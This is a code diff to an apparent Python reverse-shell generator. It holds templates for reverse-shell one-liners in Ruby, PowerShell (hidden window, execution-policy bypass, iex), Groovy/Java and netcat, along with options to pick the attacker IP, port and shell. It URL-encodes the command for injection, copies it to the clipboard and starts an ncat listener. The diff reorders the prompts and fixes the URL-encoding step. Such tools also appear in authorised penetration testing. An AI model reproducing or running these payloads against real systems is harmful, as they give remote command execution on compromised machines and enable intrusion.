@@ -17,7 +17,7 @@ failure = Style.BRIGHT + '[ ' + Fore.RED + '-' + Fore.RESET + ' ] ' + Style.RESE
 ip = socket.gethostbyname(socket.gethostname())
 port = 443
 shell = '/bin/sh'
-command_key = ''
+command_key = 'nc plain'
 
 default_template = Template(
     Style.BRIGHT + '[ default ' + Fore.GREEN + '$param' + Fore.RESET + ' ]' + Style.RESET_ALL + ' : ')
@@ -47,11 +47,10 @@ commands = {
                      'cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])'
                      'p.waitFor()'),
     'ruby': Template('ruby -rsocket -e \'f=TCPSocket.open("$ip",$port).to_i;'
-                     'exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)\''),
+                     'exec sprintf("$shell -i <&%d >&%d 2>&%d",f,f,f)\''),
     'powershell': Template('powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object '
                            'System.Net.Sockets.TCPClient("$ip",$port);'
-                           '$stream = $client.GetStream();'
-                           '[byte[]]$bytes = 0..65535|%{0};'
+                           '$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};'
                            'while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0)'
                            '{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);'
                            '$sendback = (iex $data 2>&1 | Out-String );'
@@ -104,35 +103,19 @@ def specify_port():
             print(failure + 'Choose a valid port number!')
 
 
-def choose_shell():
-    for i, k in enumerate(shells):
-        print(str(i) + ') - ' + k)
-    while True:
-        try:
-            global shell
-            num = input('Choose a shell ' + default_template.safe_substitute(param=shell))
-            if num.__eq__(''):
-                break
-            elif int(num) in range(0, len(shells)):
-                shell = list(shells.values()).__getitem__(int(num))
-                print(success + 'Using: ' + Style.BRIGHT + Fore.YELLOW + shell + Style.RESET_ALL)
-                break
-            else:
-                raise ValueError
-        except ValueError:
-            print(failure + 'Choose a number from the list!')
-
-
 def choose_command():
     for i, k in enumerate(commands):
         print(str(i) + ') - ' + k)
     while True:
         try:
-            num = int(input('Choose command from the above list : '))
-            if num in range(0, len(commands)):
+            choice = input('Choose command from the above list ' + default_template.safe_substitute(
+                param=list(commands.keys()).__getitem__(0)))
+            if choice.__eq__(''):
+                break
+            elif int(choice) in range(0, len(commands)):
                 global command_key
-                command_key = list(commands.keys()).__getitem__(num)
-                print(success + 'Using: ' + Style.BRIGHT + Fore.YELLOW + command_key + Style.RESET_ALL)
+                command_key = list(commands.keys()).__getitem__(int(choice))
+                print(information + 'Using: ' + Style.BRIGHT + Fore.YELLOW + command_key + Style.RESET_ALL)
                 break
             else:
                 raise
@@ -140,29 +123,51 @@ def choose_command():
             print(failure + 'That\'s not a valid number!')
 
 
+def choose_shell():
+    if command_key != 'powershell':
+        for i, k in enumerate(shells):
+            print(str(i) + ') - ' + k)
+        while True:
+            try:
+                global shell
+                num = input('Choose a shell ' + default_template.safe_substitute(param=shell))
+                if num.__eq__(''):
+                    break
+                elif int(num) in range(0, len(shells)):
+                    shell = list(shells.values()).__getitem__(int(num))
+                    print(information + 'Using: ' + Style.BRIGHT + Fore.YELLOW + shell + Style.RESET_ALL)
+                    break
+                else:
+                    raise ValueError
+            except ValueError:
+                print(failure + 'Choose a number from the list!')
+
+
 def build_command():
     command = commands.get(command_key).safe_substitute(ip=ip, port=port, shell=shell)
     url_encode = input('URL encode the command? [y/N] : ')
     if url_encode.lower() == 'y':
-        urllib.parse.quote_plus(command)
-        print(success + 'Command is  now URL encoded!')
+        command = urllib.parse.quote_plus(command)
+        print(information + 'Command is now URL encoded!')
     copy(command)
     print(success + 'Reverse shell command copied to clipboard!')
 
 
 def setup_listener():
     listener = input('Do you want to setup a listener? [Y/n] : ')
-    if listener == '' or listener.lower() == 'y':
-        print('Waiting for connections...')
-        os.system('ncat -lvp ' + str(port))
+    if listener.__eq__('') or listener.lower() == 'y':
+        print(success + 'Waiting for connections...')
+        os.system('ncat -lp ' + str(port))
+    else:
+        exit_program()
 
 
 if __name__ == '__main__':
     try:
         specify_ip()
         specify_port()
-        choose_shell()
         choose_command()
+        choose_shell()
         build_command()
         setup_listener()
     except KeyboardInterrupt:
